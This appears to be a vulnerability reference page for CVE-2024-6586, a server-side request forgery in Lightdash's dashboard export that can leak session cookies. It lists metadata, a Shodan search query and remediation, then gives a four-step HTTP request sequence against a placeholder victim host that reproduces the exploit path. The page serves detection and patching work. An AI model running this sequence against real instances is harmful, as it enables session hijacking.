---
layout: post
cve_id: CVE-2024-6586
title: Lightdash v0.1024.6 - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2024/CVE-2024-6586.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6586.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: high
impact: 'Authenticated attackers can create dashboards with malicious HTML elements
  that trigger HTTP requests to external domains, exfiltrating session cookies of
  users who export the dashboard.

  '
remediation: 'Update Lightdash to version 0.1024.7 or later to address the SSRF vulnerability
  in dashboard export functionality.

  '
reference:
- https://github.com/google/security-research/security/advisories/GHSA-4h7x-6vxh-7hjf
- https://nvd.nist.gov/vuln/detail/CVE-2024-6586
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N
  cvss-score: 7.3
  cve-id: CVE-2024-6586
  cwe-id: CWE-201
  epss-score: 0.15756
  epss-percentile: 0.94501
  cpe: cpe:2.3:a:lightdash:lightdash:*:*:*:*:*:*:*:*
metadata:
  max-request: 5
  verified: true
  shodan-query: title:"Lightdash"
  vendor: lightdash
  product: lightdash
tags:
- cve
- cve2024
- lightdash
- ssrf
- oast
- authenticated
- vuln
---

## üîç Vulnerability Description
Server-Side Request Forgery (‚ÄúSSRF‚Äù) in the export dashboard functionality of Lightdash version 0.1024.6 allows remote authenticated threat actors to obtain the session cookie of any user who exports a crafted dashboard. When they are exported, dashboards containing HTML elements can trigger HTTP requests to an external domain that contain the exporting user‚Äôs session cookie. The cookie could be stolen by a threat actor and used to hijack application user sessions.


## üåê HTTP Request
```nohighlight
POST /api/v1/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Content-Length: 40
Content-Type: application/json
Accept-Encoding: gzip

{"email":"aBZBDm","password":"wNVtF8ZK"}
```

```nohighlight
GET /api/v1/org/projects HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /api/v1/projects/IU2s3B/dashboards HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 47
Content-Type: application/json
Accept-Encoding: gzip

{"name":"Test","description":"Test","tiles":[]}
```

```nohighlight
POST /api/v1/dashboards/fTw6Qd/export HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 36
Content-Type: application/json
Accept-Encoding: gzip

{"queryFilters":"","gridWidth":1400}
```

